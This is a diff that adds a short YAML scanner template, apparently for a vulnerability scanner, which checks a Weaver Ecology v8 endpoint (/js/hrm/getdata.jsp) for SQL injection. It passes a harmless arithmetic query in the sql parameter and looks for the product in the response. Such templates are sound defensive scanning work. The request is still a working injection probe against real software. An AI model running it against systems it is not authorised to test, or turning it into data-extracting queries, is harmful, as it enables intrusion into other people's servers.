@@ -1,0 +1,21 @@
+id: ecology-v8-sqli
+
+info:
+    name: ecology-v8-sqli
+    author: Print1n(http://print1n.top)
+    severity: high
+
+manual: true
+transport: http
+set:
+    r1: randomInt(1000, 9999)
+    r2: randomInt(1000, 9999)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+{{r1}}*{{r2}}+as+id
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+expression: r0()
